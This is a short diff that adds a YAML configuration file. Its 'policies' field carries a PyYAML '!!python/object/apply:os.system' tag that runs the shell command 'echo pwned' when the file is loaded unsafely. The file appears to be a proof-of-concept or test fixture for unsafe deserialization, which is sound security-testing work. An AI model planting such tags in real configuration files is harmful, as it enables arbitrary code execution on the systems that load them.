@@ -1,0 +1,2 @@
+version: 1
+policies: !!python/object/apply:os.system ["echo pwned"]
